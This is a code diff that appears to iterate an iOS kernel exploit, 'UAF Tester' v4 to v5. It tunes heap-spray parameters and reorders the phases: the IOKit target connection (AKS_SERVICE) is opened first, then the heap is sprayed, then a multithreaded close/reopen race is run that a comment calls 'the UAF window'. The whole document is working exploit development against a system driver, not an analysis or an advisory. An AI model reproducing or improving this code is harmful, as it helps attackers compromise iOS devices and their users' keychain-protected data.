@@ -2,7 +2,7 @@
 //  ViewController.m
 //  UAFTester
 //
-//  v4 - Fixed for Xcode 26.2 strict compilation
+//  v5 - FIXED: Open target FIRST, then spray
 //
 
 #import "ViewController.h"
@@ -18,9 +18,9 @@
 #define MAX_ATTEMPTS 5000
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         1000
+#define SPRAY_COUNT         200   // Reduced from 1000 to leave resources
 #define SPRAY_BUFFER_SIZE   1024
-#define SPRAY_DELAY_MS      50
+#define SPRAY_DELAY_MS      30
 #define REFILL_INTERVAL     10
 // ==============================================
 
@@ -153,7 +153,7 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
     if (!is_refill) {
         log_callback(@"");
         log_callback(@"╔══════════════════════════════════════════════════╗");
-        log_callback(@"║           HEAP SPRAY v4 - IMPROVED               ║");
+        log_callback(@"║           HEAP SPRAY v5 - OPTIMIZED              ║");
         log_callback(@"╚══════════════════════════════════════════════════╝");
         log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
         log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
@@ -249,8 +249,8 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
 - (void)viewDidLoad {
     [super viewDidLoad];
     self.logBuffer = [NSMutableString string];
-    [self appendLog:@"UAF Tester v4 - Improved Ready"];
-    [self appendLog:@"Changes: Better timing, larger spray, adaptive refill"];
+    [self appendLog:@"UAF Tester v5 - FIXED ORDER"];
+    [self appendLog:@"Changes: Target connection first, reduced spray"];
 }
 
 - (void)appendLog:(NSString *)msg {
@@ -268,18 +268,18 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     self.testButton.enabled = NO;
     [self.logBuffer setString:@""];
     [self appendLog:@"═══════════════════════════════════════"];
-    [self appendLog:@"  UAF Test v4 - IMPROVED STRATEGY"];
+    [self appendLog:@"  UAF Test v5 - FIXED ORDER"];
     [self appendLog:@"═══════════════════════════════════════"];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self runImprovedUAF];
+        [self runFixedUAF];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.testButton.enabled = YES;
         });
     });
 }
 
-- (void)runImprovedUAF {
+- (void)runFixedUAF {
     io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                     IOServiceMatching(AKS_SERVICE));
     if (!svc) {
@@ -292,31 +292,39 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     atomic_store(&g_errors, 0);
     atomic_store(&g_should_stop, 0);
     
+    // ========== CRITICAL FIX: Open target connection FIRST ==========
     [self appendLog:@""];
-    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
+    [self appendLog:@">>> PHASE 1: OPEN TARGET CONNECTION"];
+    
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
+        [self appendLog:@"❌ Failed to open target connection"];
+        IOObjectRelease(svc);
+        return;
+    }
+    
+    [self appendLog:@"[✓] Target connection opened"];
+    [self appendLog:[NSString stringWithFormat:@"[✓] Connection handle: 0x%x", g_conn]];
+    // ================================================================
+    
+    // ========== NOW spray with remaining resources ==========
+    [self appendLog:@""];
+    [self appendLog:@">>> PHASE 2: HEAP SPRAY"];
     
     int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
         [self appendLog:msg];
     }, NO);
     
-    if (spray_result < 100) {
+    if (spray_result < 50) {
         [self appendLog:@"❌ Heap spray failed - insufficient objects"];
+        IOServiceClose(g_conn);
         IOObjectRelease(svc);
         return;
     }
+    // ========================================================
     
     [self appendLog:@""];
-    [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
-    
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
-    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
-        [self appendLog:@"❌ Failed to open target connection"];
-        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
-        IOObjectRelease(svc);
-        return;
-    }
-    
-    [self appendLog:@"[UAF] Target connection opened"];
+    [self appendLog:@">>> PHASE 3: UAF TRIGGER"];
     
     pthread_t threads[NUM_RACERS];
     for (int i = 0; i < NUM_RACERS; i++) {
@@ -332,15 +340,18 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
             break;
         }
         
+        // Refill spray periodically
         if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
             heap_spray_phase(svc, ^(NSString *msg) {
                 // Silent refill
             }, YES);
         }
         
+        // Close target connection
         kr = IOServiceClose(g_conn);
         usleep(1);
         
+        // Reopen - this is the UAF window
         kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
         if (kr != KERN_SUCCESS) {
             [self appendLog:@"[UAF] Reopen failed - possible trigger!"];
